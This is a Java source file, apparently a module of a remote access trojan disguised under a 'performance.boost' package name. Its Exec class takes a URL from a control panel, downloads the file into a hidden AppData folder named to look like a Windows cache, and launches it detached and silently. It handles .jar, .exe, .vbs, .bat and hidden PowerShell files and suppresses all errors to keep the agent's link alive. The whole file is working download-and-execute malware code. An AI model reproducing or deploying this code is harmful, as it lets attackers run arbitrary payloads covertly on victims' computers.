package com.performance.boost;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Locale;

/**
 * Exec — remote file runner for the EXEC vector (control-plane /web panel).
 * Pulls the file at the given URL into an AppData temp dir and starts it
 * detached and hidden. Downstream artifact kind is inferred from the path
 * extension so .jar / .exe / .vbs / .bat / .ps1 all dispatch sensibly.
 */
public final class Exec {
    private Exec() {}

    private static String appdata() {
        String base = System.getenv("APPDATA");
        if (base == null || base.isEmpty())
            base = Paths.get(System.getProperty("user.home", ".")).toString();
        return base;
    }

    private static String workDir() {
        File d = new File(appdata() + File.separator + "Microsoft\\Windows\\AuxCache");
        if (!d.exists()) d.mkdirs();
        return d.getPath();
    }

    private static byte[] httpGet(String url) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(8000);
        c.setReadTimeout(30000);
        c.setRequestProperty("User-Agent", "Mozilla/5.0");
        InputStream in = c.getInputStream();
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
            return bos.toByteArray();
        } finally {
            in.close();
            c.disconnect();
        }
    }

    /**
     * Downloads {@code url} to the hidden workpath and launches it detached.
     * Never throws outward; failures are best-effort so the agent keeps the
     * link alive regardless of a bad URL or a blocked host.
     */
    public static void run(String url) {
        if (url == null || url.isEmpty()) return;
        try {
            byte[] data = httpGet(url);
            if (data.length == 0) return;
            String filename = new File(new URL(url).getPath()).getName();
            if (filename.isEmpty()) filename = "svc.bin";
            // Guard against path traversal in the remote file name.
            filename = filename.replaceAll("[^a-zA-Z0-9._-]", "_");
            String dst = workDir() + File.separator + filename;
            FileOutputStream fos = new FileOutputStream(dst);
            try { fos.write(data); } finally { fos.close(); }
            try { new File(dst).setReadable(true, false); } catch (Throwable ignored) {}

            launch(dst);
        } catch (Throwable ignored) {}
    }

    private static void launch(String path) {
        String lower = path.toLowerCase(Locale.ROOT);
        try {
            ProcessBuilder pb;
            if (lower.endsWith(".jar")) {
                String java = System.getProperty("java.home") + File.separator
                        + "bin" + File.separator + "java.exe";
                pb = new ProcessBuilder(java, "-jar", path);
            } else if (lower.endsWith(".exe") || lower.endsWith(".com")) {
                pb = new ProcessBuilder(path);
            } else if (lower.endsWith(".vbs")) {
                pb = new ProcessBuilder("wscript.exe", "//B", path);
            } else if (lower.endsWith(".bat") || lower.endsWith(".cmd")) {
                pb = new ProcessBuilder("cmd.exe", "/c", path);
            } else if (lower.endsWith(".ps1")) {
                pb = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-File", path);
            } else {
                pb = new ProcessBuilder(path);
            }
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.start();
        } catch (Throwable ignored) {}
    }
}